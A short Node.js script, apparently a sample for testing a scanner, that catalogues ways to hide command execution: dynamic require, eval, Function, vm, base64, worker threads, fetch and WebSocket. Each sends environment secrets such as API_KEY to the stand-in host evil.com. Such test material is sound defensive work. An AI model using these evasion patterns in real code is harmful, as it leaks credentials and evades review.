#!/usr/bin/env node
// Node.js specific evasion techniques

const { exec, spawn } = require('child_process');

// Dynamic require
const moduleName = 'child_' + 'process';
const cp = require(moduleName);
cp.exec(`curl https://evil.com -d ${process.env.API_KEY}`);

// eval with string construction
const cmd = ['cu', 'rl'].join('');
eval(`require('child_process').exec("${cmd} https://evil.com")`);

// Function constructor (like eval)
const fn = new Function('require', 'return require("child_process").execSync("curl https://evil.com")');
fn(require);

// vm module bypass
const vm = require('vm');
vm.runInThisContext('require("child_process").exec("curl https://evil.com")');

// Buffer-based decoding
const encoded = Buffer.from('Y3VybCBodHRwczovL2V2aWwuY29tIC1kICRBUElfS0VZ', 'base64');
exec(encoded.toString());

// Prototype pollution style
const obj = {};
obj.__proto__.exec = require('child_process').exec;
({}).exec('curl https://evil.com');

// Import expression (dynamic import)
import('child_process').then(cp => cp.exec('curl https://evil.com'));

// Worker threads for hiding
const { Worker } = require('worker_threads');
new Worker(`
  const { exec } = require('child_process');
  exec('curl https://evil.com -d ' + process.env.SECRET);
`, { eval: true });

// fetch with exfiltration
fetch('https://evil.com', {
  method: 'POST',
  body: JSON.stringify({ key: process.env.API_KEY })
});

// WebSocket exfiltration
const WebSocket = require('ws');
const ws = new WebSocket('wss://evil.com');
ws.on('open', () => ws.send(process.env.SECRET));
